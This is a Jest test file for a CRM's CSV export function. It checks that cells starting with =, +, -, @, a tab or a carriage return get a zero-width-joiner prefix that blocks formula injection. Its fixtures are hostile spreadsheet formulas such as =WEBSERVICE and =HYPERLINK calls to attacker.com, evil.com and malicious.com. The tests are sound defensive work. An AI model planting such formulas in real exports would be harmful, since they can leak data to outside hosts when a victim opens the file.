import { type FieldMetadata } from '@/object-record/record-field/ui/types/FieldMetadata';
import { type ColumnDefinition } from '@/object-record/record-table/types/ColumnDefinition';
import { CSV_INJECTION_PREVENTION_ZWJ } from '@/spreadsheet-import/utils/csvSecurity';

import { FieldMetadataType, RelationType } from '~/generated-metadata/graphql';
import {
  displayedExportProgress,
  generateCsv,
} from '../useRecordIndexExportRecords';

jest.useFakeTimers();

describe('generateCsv', () => {
  it('generates a csv with formatted headers', async () => {
    const columns = [
      { label: 'Foo', metadata: { fieldName: 'foo' } },
      { label: 'Empty', metadata: { fieldName: 'empty' } },
      {
        label: 'Nested link field',
        type: FieldMetadataType.LINKS,
        metadata: { fieldName: 'nestedLinkField' },
      },
      {
        label: 'Relation',
        metadata: {
          fieldName: 'relation',
          relationType: RelationType.MANY_TO_ONE,
        },
      },
    ] as ColumnDefinition<FieldMetadata>[];
    const rows = [
      {
        id: '1',
        bar: 'another field',
        empty: null,
        foo: 'some field',
        nestedLinkField: {
          __typename: 'Links',
          primaryLinkUrl: 'https://www.test.com',
          secondaryLinks: [
            { label: 'secondary link 1', url: 'https://www.test.com' },
            { label: 'secondary link 2', url: 'https://www.test.com' },
          ],
        },
        relation: 'a relation',
      },
    ];
    const csv = generateCsv({ columns, rows });
    expect(csv)
      .toEqual(`Id,Foo,Empty,Nested link field / Link URL,Nested link field / Secondary Links,Relation
1,some field,,https://www.test.com,"[{""label"":""secondary link 1"",""url"":""https://www.test.com""},{""label"":""secondary link 2"",""url"":""https://www.test.com""}]",a relation`);
  });

  describe('CSV Injection Prevention with ZWJ', () => {
    it('prevents formula injection with equals sign using ZWJ prefix', () => {
      const columns = [
        { label: 'Name', metadata: { fieldName: 'name' } },
        { label: 'Formula', metadata: { fieldName: 'formula' } },
      ] as ColumnDefinition<FieldMetadata>[];

      const rows = [
        {
          id: '1',
          name: 'Test User',
          formula: '=WEBSERVICE("http://attacker.com")',
        },
      ];

      const csv = generateCsv({ columns, rows });

      // The malicious formula should be prefixed with ZWJ (preserving original content)
      expect(csv).toContain(
        `${CSV_INJECTION_PREVENTION_ZWJ}=WEBSERVICE(""http://attacker.com"")`,
      );
      // Should not contain the raw dangerous formula
      expect(csv).not.toContain(
        '1,Test User,=WEBSERVICE("http://attacker.com")',
      );
      // Should contain the ZWJ-prefixed version in CSV format
      expect(csv).toContain(
        `1,Test User,"${CSV_INJECTION_PREVENTION_ZWJ}=WEBSERVICE(""http://attacker.com"")"`,
      );
    });

    it('prevents formula injection with plus sign using ZWJ prefix', () => {
      const columns = [
        { label: 'Calculation', metadata: { fieldName: 'calculation' } },
      ] as ColumnDefinition<FieldMetadata>[];

      const rows = [
        {
          id: '1',
          calculation: '+1+1',
        },
      ];

      const csv = generateCsv({ columns, rows });

      // Should preserve the original content with ZWJ prefix
      expect(csv).toContain(`${CSV_INJECTION_PREVENTION_ZWJ}+1+1`);
      // Should not contain the raw dangerous formula
      expect(csv).not.toContain('1,+1+1');
    });

    it('prevents formula injection with minus sign using ZWJ prefix', () => {
      const columns = [
        { label: 'Calculation', metadata: { fieldName: 'calculation' } },
      ] as ColumnDefinition<FieldMetadata>[];

      const rows = [
        {
          id: '1',
          calculation: '-1+1',
        },
      ];

      const csv = generateCsv({ columns, rows });

      // Should preserve the original content with ZWJ prefix
      expect(csv).toContain(`${CSV_INJECTION_PREVENTION_ZWJ}-1+1`);
      // Should not contain the raw dangerous formula
      expect(csv).not.toContain('1,-1+1');
    });

    it('prevents formula injection with at symbol using ZWJ prefix', () => {
      const columns = [
        { label: 'Reference', metadata: { fieldName: 'reference' } },
      ] as ColumnDefinition<FieldMetadata>[];

      const rows = [
        {
          id: '1',
          reference: '@SUM(1,1)',
        },
      ];

      const csv = generateCsv({ columns, rows });

      // Should preserve the original content with ZWJ prefix
      expect(csv).toContain(`${CSV_INJECTION_PREVENTION_ZWJ}@SUM(1,1)`);
      // Should not contain the raw dangerous formula
      expect(csv).not.toContain('1,@SUM(1,1)');
    });

    it('prevents formula injection with tab character using ZWJ prefix', () => {
      const columns = [
        { label: 'Data', metadata: { fieldName: 'data' } },
      ] as ColumnDefinition<FieldMetadata>[];

      const rows = [
        {
          id: '1',
          data: '\t=WEBSERVICE("http://attacker.com")',
        },
      ];

      const csv = generateCsv({ columns, rows });

      // Should preserve the original content with ZWJ prefix (accounting for CSV escaping)
      expect(csv).toContain(
        `${CSV_INJECTION_PREVENTION_ZWJ}\t=WEBSERVICE(""http://attacker.com"")`,
      );
      // Should not contain the raw dangerous formula
      expect(csv).not.toContain('1,\t=WEBSERVICE("http://attacker.com")');
    });

    it('prevents formula injection with carriage return using ZWJ prefix', () => {
      const columns = [
        { label: 'Data', metadata: { fieldName: 'data' } },
      ] as ColumnDefinition<FieldMetadata>[];

      const rows = [
        {
          id: '1',
          data: '\r=WEBSERVICE("http://attacker.com")',
        },
      ];

      const csv = generateCsv({ columns, rows });

      // Should preserve the original content with ZWJ prefix (accounting for CSV escaping)
      expect(csv).toContain(
        `${CSV_INJECTION_PREVENTION_ZWJ}\r=WEBSERVICE(""http://attacker.com"")`,
      );
      // Should not contain the raw dangerous formula
      expect(csv).not.toContain('1,\r=WEBSERVICE("http://attacker.com")');
    });

    it('handles multiple injection attempts in different fields with ZWJ prefix', () => {
      const columns = [
        { label: 'Field1', metadata: { fieldName: 'field1' } },
        { label: 'Field2', metadata: { fieldName: 'field2' } },
        { label: 'Field3', metadata: { fieldName: 'field3' } },
      ] as ColumnDefinition<FieldMetadata>[];

      const rows = [
        {
          id: '1',
          field1: '=WEBSERVICE("http://evil.com")',
          field2: '+SUM(A1:A10)',
          field3: '-HYPERLINK("http://malicious.com")',
        },
      ];

      const csv = generateCsv({ columns, rows });

      // All dangerous values should be preserved with ZWJ prefix (accounting for CSV escaping)
      expect(csv).toContain(
        `${CSV_INJECTION_PREVENTION_ZWJ}=WEBSERVICE(""http://evil.com"")`,
      );
      expect(csv).toContain(`${CSV_INJECTION_PREVENTION_ZWJ}+SUM(A1:A10)`);
      expect(csv).toContain(
        `${CSV_INJECTION_PREVENTION_ZWJ}-HYPERLINK(""http://malicious.com"")`,
      );

      // Original dangerous payloads should not be present without ZWJ prefix
      expect(csv).not.toContain('1,=WEBSERVICE("http://evil.com")');
      expect(csv).not.toContain(',+SUM(A1:A10)');
      expect(csv).not.toContain(',-HYPERLINK("http://malicious.com")');
    });

    it('preserves legitimate content that does not start with dangerous characters', () => {
      const columns = [
        { label: 'Name', metadata: { fieldName: 'name' } },
        { label: 'Email', metadata: { fieldName: 'email' } },
        { label: 'Description', metadata: { fieldName: 'description' } },
      ] as ColumnDefinition<FieldMetadata>[];

      const rows = [
        {
          id: '1',
          name: 'John Doe',
          email: 'john@example.com',
          description:
            'This is a normal description with = and + symbols in the middle',
        },
      ];

      const csv = generateCsv({ columns, rows });

      // Legitimate content should be preserved
      expect(csv).toContain('John Doe');
      expect(csv).toContain('john@example.com');
      expect(csv).toContain(
        'This is a normal description with = and + symbols in the middle',
      );
    });
  });
});

describe('displayedExportProgress', () => {
  it.each([
    [undefined, undefined, 'percentage', 'Export'],
    [20, 50, 'percentage', 'Export (40%)'],
    [0, 100, 'number', 'Export (0)'],
    [10, 10, 'percentage', 'Export (100%)'],
    [10, 10, 'number', 'Export (10)'],
    [7, 9, 'percentage', 'Export (78%)'],
  ])(
    'displays the export progress',
    (exportedRecordCount, totalRecordCount, displayType, expected) => {
      expect(
        displayedExportProgress({
          exportedRecordCount,
          totalRecordCount,
          displayType: displayType as 'percentage' | 'number',
        }),
      ).toEqual(expected);
    },
  );
});
